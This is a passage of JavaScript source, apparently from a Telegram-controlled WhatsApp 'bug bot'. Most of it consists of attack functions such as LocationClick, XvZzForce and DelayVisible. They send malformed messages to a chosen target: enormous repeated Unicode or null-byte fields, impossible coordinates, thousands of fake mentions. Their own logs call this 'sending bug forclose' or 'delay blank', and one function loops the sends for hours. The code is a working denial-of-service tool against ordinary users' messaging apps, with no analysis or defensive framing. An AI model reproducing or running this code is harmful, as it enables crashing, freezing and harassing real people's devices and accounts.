         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/Zeniferl",
         mediaUrl: "https://t.me/Zeniferl",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: target }
 });
 
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}
 
 async function exoticsIPV2(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -66.666,
            degreesLongtitude: 66.666,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            jpegThumbnail: null,
            url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
            contextInfo: {
              participant: target,
              forwardingScore: 1,
              isForwarded: true,
              stanzaId: target,
              mentionedJid: [target]
            },
          },
        },
      },
    }, {});
    
   await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
          title: "@Xavienzz",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰtׁׅꭈׁׅꫀׁׅܻ᥎꫶ׁׅᨵׁׅ꯱ׁׅ֒ꪱׁׅυׁׅ ꩇ",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/Xavienzz",
         mediaUrl: "https://t.me/Xavienzz",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        },
      },
     skipType: 7,
    }
  }, {
   participant: { jid: target }
 });
 
  await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }],
        }],
      }],
    });
  } catch (error) {
    console.log(error);
  }
}

//=====( Blank Ios )=====\\

async function iosProduct2(target) {
 await sock.sendMessage(
    target,
    {
          productMessage: {
            title: "👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>",
            description: "👁‍🗨⃟꙰。⃝𝐓𝐫𝐞𝐯𝐨𝐬𝐢𝐮𝐦 ⌁ 𝐀𝐭𝐭𝐚𝐜𝐤.ꪸ⃟‼️  Ꮂ ⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
            thumbnail: null,
            productId: "X99",
            retailerId: "X1Y1Z1",
            url: "https://t.me/Xavienzz",
            body: "🩸" + "𑇂𑆵𑆴𑆿".repeat(1000),
            footer: "🩸",
            contextInfo: {
              remoteJid: "13135559098@s.whatsapp.net",
              mentionedJid: "status@broadcast",
              participant: "13135559098@s.whatsapp.net",
              forwardingScore: 9999,
              isForwarded: true,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135559098@s.whatsapp.net"
              },
              externalAdReply: {
                automatedGreetingMessageShown: true,
                automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                greetingMessageBody: "\u0000",
              }
            },
            priceAmount1000: 50000,
            currencyCode: "USD"
          }
    },
    { quoted: quotedios, userJid: target }
  )
}

async function xCursedDelayIos(target) {
  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 1e308,
        degreesLongitude: 1e308,
        name: "\u0000" + "ꦾ".repeat(100000),
        address: "\u0000" + "ꦾ".repeat(100000),
        jpegThumbnail: null,
        url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}`,
        contextInfo: {
          participant: "13135559098@s.whatsapp.net",
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

//=====( Forclose )=====\\

async function LocationClick(sock, target) {
  try {
      await sock.sendMessage(target, {
        location: {
          degreesLatitude: 254515607254515602025.843324832,
          degreesLongitude: 254515607254515602025.843324832,
          name: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄",
          address: "Asalamualaikum paket dari Lolipop",
          jpegThumbnail: Buffer.from(
            "iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAMAAADyQn0PAAAAG1BMVEUAAAD///8AAAB/f39ISEhpaWmqqqq4uLjo6OjT09P4+Pjv7++3t7e9vb3AwMBvb2+np6fHx8eYmJiioqLw8PDn5+eTk5NwcHB9fX2tra3Pz8+cnJxVVVVGRkY2NjZ0dHRkZGQeHh6EhIRoaGh/f3+srKyqqqqioqLZ2dnCwsKmpqbLy8vR0dGUlJSHh4d5eXlISEhXV1dCQkJra2s/Pz+YmJiSkpKJiYmBgYFLS0vDw8Ojo6OcnJzExMS/v79oaGhERERvb28ZGRkYGBhSUlK0tLRbW1tHR0d/f39ZWVlLS0tJSUlCQkJPT09+fn5paWlAQEBwcHCenp6mpqaAgIB0dHScnJwAAAB5tqW0AAABOElEQVR4nO3bS27DMAxFUQ9E2///M0d7G1lRpg5iX9G4lK0q1z0wAAAAAAAAAAAAAAAADw3+o6q5rZ9Tnqjv6x+MZ7w4m2y7H1u4b0n5m7Z8pM3Z+6f6x4k2aPp4dH8m2b6Pp4eH8nWb6Pp4dH8m2b6Pp4eH8nWb6Pp4dH8m2b6Pp4eH8nWb6Pp4dH8AAAAAAAAAAAAAAAAAAAAAAAD4Bv4B8a6p1X3j8gAAAABJRU5ErkJggg==",
            "base64"
          )
        },
        caption: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄"
      })

      await sock.sendMessage(target, {
        channelInviteMessage: {
          channelJid: "120363407643835026@newsletter",
          channelName: "👻⃟Ṫṛëṿöṡïüṁ ṚÖṚ༄",
          caption: "ꦾ".repeat(100000)
        }
      })

      await sock.sendMessage(target, {
        orderMessage: {
          orderId: "ORDER-001",
          itemCount: 1,
          status: 1,
          surface: 1,
          message: "ꦽ".repeat(100000),
          orderTitle: "Trevosium_Ghost",
          sellerJid: sock.user.id,
          token: " ",
          totalAmount1000: 999999,
          totalCurrencyCode: "IDR"
        }
      })

      console.log(`Succes Sending Bug Forclose Click To ${target}`)

  } catch (err) {
    console.log("Failed Sending Bug => Error:", err)
  }
}

//=====( Delay Blank Visible )=====\\

async function VnXDelayContactNew(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
           viewOnceMessage: {
             message: {
              templateButtonReplyMessage: {
               amount: "CORRUPT",
               selectedIndex: null,
                contextInfo: {
                stanzaId: null, 
                participant: target,
                 paymentInviteMessage: null,
                quotedMessage: {
                   contactMessage: {
                        displayName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ြ".repeat(25000),
                         vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)${"ြ".repeat(25000)}\nEND:VCARD`,
                        renderLargerThumbnail: true,
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                               }
                             }
                           }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        const vnxmbgg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                   body: {
                     text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                     format: "DEFAULT"
                   },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                      version: 3
                     },
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
              message: vnxmbgg.message,
            },
        }, {
            messageId: vnxmbgg.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}

async function KayzenIsHereGajelasLu(sock, target) {
  try {
    const kayzenNihBoss = {
      viewonceMessage: {
        message: {
          interactiveMessage: {
            newsletterAdminInviteMessage: {
              newsletterJid: "123456789@newsletter",
              inviteCode: "ြ".repeat(120000),
              inviteExpiration: 9999999999,
              newsletterName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦽ".repeat(250000),
              body: {
                text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦾ".repeat(250000)
              }
            },
            interactiveResponseMessage: {
              header: {
                title: "\u0000" + "{{".repeat(25000)
              },
              body: {
                text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(160000),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          }
        },
        version: 3
      }
    };

    await sock.relayMessage(target, kayzenNihBoss, {
      participant: { jid: target }
    });

    console.log(`Succes Sending Bug DelayBlank To ${target}`);

  } catch (e) {
    console.log("erorr:", e.message);
  }
}

async function DelayVisible(sock, target) {
console.log(chalk.red(`Succes Sending Bug DelayBlank To ${target}`));
    await sock.relayMessage(target, {
        interactiveResponseMessage: {
            body: {
                text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(150000),
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + " ¡! ",
                isForwarded: true,
                forwardingScore: 999,
                participant: target,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                        "\u0000": "Permission_Array"
                    }))
                }
            }
        }
    }, {});
}

async function RvXDelayui(sock, target) {
 let RVX = await generateWAMessageFromContent(
   target,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
              fileLength: "999999999999999",
              fileName: "ြ".repeat(150000),
              height: 999999,
              width: 999999,
              mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
              fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
              directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1755695348",
              jpegThumbnail: null
            }
          },
          body: {
            text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ꦽ".repeat(120000)
          },
          footer: {
            text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)" + "ြ".repeat(130000)
          },
          nativeFlowMessage: {
            nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/channel/status\"}"
            }
          ]
            }
          }
        }
      }
      }
    }, 
  { userJid: target }
); 

  await sock.relayMessage(
    target,
      RVX.message,
    {
      participant: { jid: target },
      messageId: null
    }
  );
}

async function eventFlowres(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: crypto.randomBytes(32)
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)̤",
                        description: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                        location: {
                            degreesLatitude: "a",
                            degreesLongitude: "a",
                            name: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
                        },
                        joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                        startTime: "1714957200",
                        thumbnailDirectPath: "https://files.catbox.moe/6hu21j.jpg",
                        thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                        thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                        mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                        mediaKeyTimestamp: Date.now(),
                        contextInfo: {
                            mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                            remoteJid: "status@broadcast",
                            participant: "0@s.whatsapp.net",
                            fromMe: false,
                            isForwarded: true,
                            forwardingScore: 9999,
                            forwardedNewsletterMessageInfo: {
                              newsletterJid: "120363422445860082@newsletter",
                              serverMessageId: 1,
                              newsletterName: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)"
                            },
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: {
                                        text: "┃► 𝚃𝚛𝚎𝚟𝚘𝚜𝚒𝚞𝚖 (🦠)",
                                        format: "DEFAULT"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: 'address_message',
                                        paramsJson: "\x10".repeat(1000000),
                                        version: 3
                                    }
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            ephemeralExpiration: 5,
            timeStamp: Date.now()
        }
    );
}

async function FriendNewsLaster(sock, groupJid) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "123456789@newsletter",
      inviteCode: "𑜦𑜠".repeat(12000),
      inviteExpiration: 99999999999,
      newsletterName: "ោ៝".repeat(15000) + "ꦾ".repeat(25000),
      body: {
        text: "\u0000" + "ી".repeat(35000)
      },
    },
  };

  await sock.relayMessage(groupJid, msg, {});

  await sock.relayMessage(
    groupJid,
    {
      interactiveResponseMessage: {
        body: {
          text: "\u0000",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(150000),
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + " ¡! ",
          isForwarded: true,
          forwardingScore: 999,
          participant: groupJid,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
              "\u0000": "Permission_Array"
            }))
          }
        }
      }
    },
    {}
  );
}

async function TrdxtCountV3(duration, target) {
  const totalDuration = duration * 60 * 60 * 1000;
  const startTime = Date.now();
  let amount = 0;
  let maxSend = 9999;
  let delay = "1s";

  const parseDelay = (input) => {
    if (typeof input === "number") return input;

    const num = parseInt(input);
    if (input.endsWith("s")) return num * 1000;
    if (input.endsWith("m")) return num * 60 * 1000;
    if (input.endsWith("h")) return num * 60 * 60 * 1000;

    return 5000;
  };

  const delayMs = parseDelay(delay);

  const nextMessage = async () => {
    if (Date.now() - startTime >= totalDuration) {
      console.log(chalk.red(`Succes Sending Bug Forclose To ${target}`));
      return;
    }

    if (amount < maxSend) {
      await XvZzForce(sock, target);

      amount++;
      console.log(chalk.red(`Succes Sending Bug Forclose To ${target}`));

      setTimeout(nextMessage, delayMs);

    } else {
      console.log(chalk.red(`Succes Sending Bug Forclose To ${target}`));
      amount = 0;

      console.log(chalk.red(`Succes Sending Bug Forclose To ${target}`));

      setTimeout(nextMessage, delayMs);
    }
  };

  nextMessage();
}

async function XvZzForce(sock, target) {
  try {
    const randomMentions = Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    );

    const message = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: 10610,
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: 1775044724091
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...randomMentions
            ],
            quotedMessage: {
              paymentAdminInviteMessage: {
                serviceType: "ADMIN_INVITE",
                expiryTimestamp: Date.now() + 86400000,
                currencyCode: "IDR",
                amount1000: "9999",
                receiverJid: target,
                noteMessage: {
                  extendedTextMessage: {
                    text: "X"
                  }
                }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(
      target,
      message,
      {
        messageId: null,
        participant: { jid: target }
      }
    );

  } catch (err) {
    console.error("Error:", err);
  }
}

async function makanmalam(sock, target) {
  try {
    await sock.relayMessage(
      target,
      {
        albumMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            ),
            remoteJid: "oconner-hard",
            parentGroupJid: "0@g.us",
            isQuestion: true,
            isSampled: true,
            entryPointConversionDelaySeconds: 6767676767,
            businessMessageForwardInfo: null,
            botMessageSharingInfo: {
              botEntryPointOrigin: {
                origins: "BOT_MESSAGE_OCONNER"
              },
              forwardScore: 999
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "X",
                      format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "\u0000".repeat(1500000),
                      version: 1
                    }
                  }
                }
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );

    const MsgNew = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    };

    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });

    console.log(`Succes Sending Bug Forclose To ${target}`);
    await new Promise(resolve => setTimeout(resolve, 1200));

  } catch (e) {
    console.log("Error:", e);
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
}

async function VnXFcClickAi(sock, target) {
  const VnXAiNew = [
    "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
    "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
    "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
    "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
    "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net"
  ];
  const mentions = Array.from({ length: 20900 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
  const VnXMsg = {
    requestPaymentMessage: {
         currencyCodeIso4217: "IDR",
          amount1000: "9999",
            requestFrom: target,
                noteMessage: {
                    extendedTextMessage: {
                        text: 'Trevosium-Ghost</👾>'
                    }
                },
                expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
                amount: {
                    value: 1000,
                    offset: 1000,
                    currencyCode: 'IDR'
                },
                background: {
                    id: '1' 
                },
               contextInfo: {
                mentionedJid: VnXAiNew + mentions,
               remoteJid: null, 
                forwardingScore: 9999,
                isForwarded: true,
             }
         }
     };
    await sock.relayMessage(target, VnXMsg, {});
}

//And The Function


bot.launch()
